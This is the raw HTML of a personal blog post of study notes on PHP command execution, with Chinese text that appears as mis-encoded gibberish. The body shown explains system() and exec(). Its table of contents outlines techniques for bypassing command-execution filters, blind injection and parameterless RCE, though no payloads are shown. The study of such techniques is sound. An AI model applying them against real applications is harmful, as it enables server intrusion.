<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="kinsey"><meta name="copyright" content="kinsey"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>å‘½ä»¤æ‰§è¡Œ | åŒ—æ­Œ</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.js"></script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.min.js"></script><script type="module">import { renderKatex } from '/js/utils.js'
document.addEventListener("DOMContentLoaded", () => {
  renderKatex({
    ...{},
    ...undefined?.options,
  });
});</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"kinseyy.github.io","root":"/","title":"åŒ—æ²åŸæ­Œ","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"algolia":{"appID":"LWKPDLFKV6","apiKey":"6f230e5e2cdf36415bd02b48c1138c08","indexName":"my-hexo-blog","hits":{"per_page":8}},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://kinsey-six.vercel.app","comment":true,"visitor":true,"emoji":["https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"å¡«å†™é‚®ç®±ï¼Œå¯ä»¥æ”¶åˆ°å›å¤é€šçŸ¥å“¦ï½"},"requiredMeta":["nick"],"el":"#waline","lang":"en"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="åŒ—æ­Œ" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"S8MhECl1Bg6fZt5ulKgIlajS-MdYXbMMI","app_key":"eLIsYKPJFnSJdwmHLoigqBR4","server_url":"https://s8mhecl1.api.lncldglobal.com"}</script><script defer src="/js/analytics/leancloud-visitors.js" type="module"></script><meta name="description" content="å‘½ä»¤æ‰§è¡Œå‘½ä»¤æ‰§è¡Œå‡½æ•°systemsystem(string $command,int &amp;$return_val&#x3D;?) å¸¸ç”¨å‚æ•°ï¼šcommandï¼šæ‰§è¡Œcommandå‚æ•°æ‰€æŒ‡å®š2çš„å‘½ä»¤ï¼Œå¹¶ä¸”è¾“å‡ºæ‰§è¡Œç»“æœ â€‹					å¦‚æœæä¾›return_varå‚æ•°ï¼Œåˆ™å¤–éƒ¨å‘½ä»¤æ‰§è¡Œåçš„è¿”å›çŠ¶æ€å°†ä¼šè¢«è®¾ç½®åˆ°æ­¤å˜é‡ä¸­	   execexec(string $command,array&amp;$outpu">
<meta property="og:type" content="article">
<meta property="og:title" content="å‘½ä»¤æ‰§è¡Œ">
<meta property="og:url" content="https://kinseyy.github.io/2024/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
<meta property="og:site_name" content="åŒ—æ­Œ">
<meta property="og:description" content="å‘½ä»¤æ‰§è¡Œå‘½ä»¤æ‰§è¡Œå‡½æ•°systemsystem(string $command,int &amp;$return_val&#x3D;?) å¸¸ç”¨å‚æ•°ï¼šcommandï¼šæ‰§è¡Œcommandå‚æ•°æ‰€æŒ‡å®š2çš„å‘½ä»¤ï¼Œå¹¶ä¸”è¾“å‡ºæ‰§è¡Œç»“æœ â€‹					å¦‚æœæä¾›return_varå‚æ•°ï¼Œåˆ™å¤–éƒ¨å‘½ä»¤æ‰§è¡Œåçš„è¿”å›çŠ¶æ€å°†ä¼šè¢«è®¾ç½®åˆ°æ­¤å˜é‡ä¸­	   execexec(string $command,array&amp;$outpu">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152203957.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152213807.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152216415.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152232616.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152243626.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161437313.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161438824.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161440425.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404161521446.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222117087.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222137215.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222154839.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222159031.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222200738.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222204341.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222207997.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404222212392.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404231458831.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404231519432.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241718857.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241758202.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241816512.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241956456.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241958280.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241959619.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251351441.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251416193.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251436045.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251500945.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251506528.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071406094.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404271923282.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404271953465.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404272001638.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071410666.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071943478.png">
<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405072009305.png">
<meta property="article:published_time" content="2024-10-08T12:12:51.000Z">
<meta property="article:modified_time" content="2025-03-16T07:40:17.536Z">
<meta property="article:author" content="kinsey">
<meta property="article:tag" content="rce">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152203957.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="kinsey"><img width="96" loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405312004243.jpeg" alt="kinsey"><span class="site-author-status" title="Looking for dawn.">ğŸŒ‘</span></a><div class="site-author-name"><a href="/about/">kinsey</a></div><span class="site-name">åŒ—æ­Œ</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">220</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">101</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/kinseyy" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="ç½‘æ˜“äº‘éŸ³ä¹" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><span class="icon iconify" data-icon="ri:train-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="å–œæ¬¢çš„å¥³å­©å­" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">å‘½ä»¤æ‰§è¡Œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">å‘½ä»¤æ‰§è¡Œå‡½æ•°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#system"><span class="toc-number">2.1.</span> <span class="toc-text">system</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exec"><span class="toc-number">2.2.</span> <span class="toc-text">exec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#passthru"><span class="toc-number">2.3.</span> <span class="toc-text">passthru</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shell-exec"><span class="toc-number">2.4.</span> <span class="toc-text">shell_exec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="toc-number">2.5.</span> <span class="toc-text">åå¼•å·</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#popen"><span class="toc-number">2.6.</span> <span class="toc-text">popen</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pcntl-exec"><span class="toc-number">2.7.</span> <span class="toc-text">pcntl_exec</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">æ›¿æ¢ç»•è¿‡å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mail"><span class="toc-number">5.</span> <span class="toc-text">mail()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%9D%A1%E4%BB%B6"><span class="toc-number">5.1.</span> <span class="toc-text">ç»•è¿‡æ¡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">5.2.</span> <span class="toc-text">æ„é€ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EVIL-CMDLINE"><span class="toc-number">5.3.</span> <span class="toc-text">EVIL_CMDLINE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E5%8F%8Apcntl%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4"><span class="toc-number">6.</span> <span class="toc-text">èšå‰‘åŠpcntlç»•è¿‡å‡½æ•°è¿‡æ»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%9A%81%E5%89%91"><span class="toc-number">6.1.</span> <span class="toc-text">èšå‰‘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pcntl-exec%E5%87%BD%E6%95%B0"><span class="toc-number">6.2.</span> <span class="toc-text">pcntl_execå‡½æ•°</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-number">7.</span> <span class="toc-text">æ“ä½œç³»ç»Ÿè¿æ¥ç¬¦</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#-1"><span class="toc-number">7.1.</span> <span class="toc-text">;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-2"><span class="toc-number">7.2.</span> <span class="toc-text">&amp;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-3"><span class="toc-number">7.3.</span> <span class="toc-text">&amp;&amp;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-4"><span class="toc-number">7.4.</span> <span class="toc-text">|</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-5"><span class="toc-number">7.5.</span> <span class="toc-text">||</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">æ–‡ä»¶åè¿‡æ»¤ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">10.</span> <span class="toc-text">å¸¸è§æ–‡ä»¶è¯»å–å‘½ä»¤ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">11.</span> <span class="toc-text">ç¼–ç ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">12.</span> <span class="toc-text">æ— å›æ˜¾æ—¶é—´ç›²æ³¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">13.</span> <span class="toc-text">é•¿åº¦è¿‡æ»¤ç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">13.1.</span> <span class="toc-text">ç›¸å…³å‘½ä»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%92%8C-%E7%AC%A6%E5%8F%B7"><span class="toc-number">13.1.1.</span> <span class="toc-text">1.&gt;å’Œ&gt;&gt;ç¬¦å·</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%91%BD%E4%BB%A4%E6%8D%A2%E8%A1%8C"><span class="toc-number">13.1.2.</span> <span class="toc-text">2.å‘½ä»¤æ¢è¡Œ</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-ls-t%E5%91%BD%E4%BB%A4"><span class="toc-number">13.1.3.</span> <span class="toc-text">3. ls -tå‘½ä»¤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E7%BB%84%E5%90%88%E8%BF%90%E7%94%A8"><span class="toc-number">13.1.4.</span> <span class="toc-text">4.ç»„åˆè¿ç”¨</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-dir%E5%8F%8A-%E5%92%8Crev"><span class="toc-number">13.1.5.</span> <span class="toc-text">5.diråŠ*å’Œrev</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E4%B8%BA7%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">13.2.</span> <span class="toc-text">é•¿åº¦é™åˆ¶ä¸º7çš„ç»•è¿‡æ–¹æ³•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E4%B8%BA5%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">13.3.</span> <span class="toc-text">é•¿åº¦é™åˆ¶ä¸º5çš„ç»•è¿‡æ–¹æ³•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E4%B8%BA4%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">13.4.</span> <span class="toc-text">é•¿åº¦é™åˆ¶ä¸º4çš„ç»•è¿‡æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%BB%95%E8%BF%87"><span class="toc-number">14.</span> <span class="toc-text">æ— å‚æ•°å‘½ä»¤æ‰§è¡Œè¯·æ±‚å¤´ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8FRCE"><span class="toc-number">15.</span> <span class="toc-text">æ— å‚æ•°å…¨å±€å˜é‡RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Csession"><span class="toc-number">16.</span> <span class="toc-text">æ— å‚æ•°å‘½ä»¤æ‰§è¡Œsession</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://kinseyy.github.io/2024/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="kinsey"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="åŒ—æ­Œ"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">å‘½ä»¤æ‰§è¡Œ<a class="post-edit-link" href="https://github.com/kinseyy/kinseyy.github.io/tree/master/2024/05/31/hello-world_posts/å‘½ä»¤æ‰§è¡Œ.md" target="_blank" title="Edit this post" rel="noopener"><span class="icon iconify" data-icon="ri:edit-line"></span></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-10-08 20:12:51" itemprop="dateCreated datePublished" datetime="2024-10-08T20:12:51+08:00">2024-10-08</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2025-03-16 15:40:17" itemprop="dateModified" datetime="2025-03-16T15:40:17+08:00">2025-03-16</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">3.9k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">15m</span></span></span><span class="leancloud_visitors" id="/2024/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-flag-title="å‘½ä»¤æ‰§è¡Œ"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><span class="icon iconify" data-icon="ri:eye-line"></span> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="Comments"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/2024/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">å­¦ä¹ ç¬”è®°</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/rce/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">rce</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><h3 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œå‡½æ•°</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a><strong>system</strong></h4><p><strong>system(string $command,int &amp;$return_val&#x3D;?)</strong></p>
<p>å¸¸ç”¨å‚æ•°ï¼šcommandï¼šæ‰§è¡Œcommandå‚æ•°æ‰€æŒ‡å®š2çš„å‘½ä»¤ï¼Œå¹¶ä¸”è¾“å‡ºæ‰§è¡Œç»“æœ</p>
<p>â€‹					å¦‚æœæä¾›return_varå‚æ•°ï¼Œåˆ™å¤–éƒ¨å‘½ä»¤æ‰§è¡Œåçš„è¿”å›çŠ¶æ€å°†ä¼šè¢«è®¾ç½®åˆ°æ­¤å˜é‡ä¸­	</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152203957.png" alt="image-20240415220301914" loading="lazy"></p>
<hr>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a><strong>exec</strong></h4><p><strong>exec(string $command,array&amp;$output&#x3D;?,int&amp;$return_car&#x3D;?)</strong></p>
<p>commandå‚æ•°ï¼šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚å•ç‹¬ä½¿ç”¨æ—¶åªæœ‰æœ€åä¸€è¡Œç»“æœï¼Œä¸”ä¸ä¼šå›æ˜¾</p>
<p>outputå‚æ•°ï¼šç”¨å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºå¡«å……æ­¤æ•°ç»„ï¼Œæ¯è¡Œè¾“å‡ºå¡«å……æ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚å³é€è¡Œå¡«å……æ•°ç»„</p>
<p>éœ€å€Ÿç”¨print_rè¾“å‡ºç»“æœ</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404152213807.png" alt="image-20240415221342762" loading="lazy"></p>
<hr>
